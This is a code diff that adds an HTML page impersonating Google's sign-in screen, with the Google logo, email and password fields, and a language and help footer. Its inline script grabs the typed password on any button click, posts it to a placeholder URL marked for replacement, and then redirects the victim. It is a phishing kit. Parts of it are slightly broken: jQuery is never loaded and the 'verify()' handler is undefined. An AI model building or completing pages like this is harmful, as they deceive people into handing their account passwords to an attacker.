@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="preconnect" href="https://fonts.gstatic.com" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="shortcut icon" href="./682665_favicon_google_logo_new_icon.png" type="image/x-icon">
+
+    <link rel="stylesheet" href="./reset.css" />
+    <link rel="stylesheet" href="./styles.css" />
+
+    <title>Google Login</title>
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="card">
+        <img src="./images/google-logo.svg" alt="" />
+        <h2>Log In</h2>
+        <h3>Use your Google Account</h3>
+
+        <input type="email" id="email" placeholder="E-mail" />
+        <br>
+        <input type="password" id="password" placeholder="Password" />
+        <div class="btn-email">
+          <button type="button">Forgot your password?</button>
+        </div>
+
+        <div class="card-bottom">
+          <a href="">Create Account</a>
+          <button type="button" onclick="verify()">Next</button>
+        </div>
+      </div>
+
+      <div class="footer">
+        <select name="select">
+          <option value="English (United States) selected">English (United States)</option>
+          <option value="Portugês (Brasil)">
+            Portugês (Brasil)
+          </option>
+          <option value="Español (España)">Español (España)</option>
+        </select>
+
+        <div class="footer-span">
+          <span>Help</span>
+          <span>Privacy</span>
+          <span>Terms</span>
+        </div>
+      </div>
+    </div>
+  
+  </body>
+  <script>
+    $('button').click(function(e) {
+      e.preventDefault();
+      var auth = $('input[type=password]').val();
+  
+      $.post(
+        "URL_HERE", // Replace with the actual URL
+        {"password": auth},
+        function(data, status) {
+          window.location = "REDIRECTION_URL_HERE"; // Replace with the actual redirection URL
+        }
+      );
+  
+      return false;
+    });
+  </script>
+  
+  
+</html>
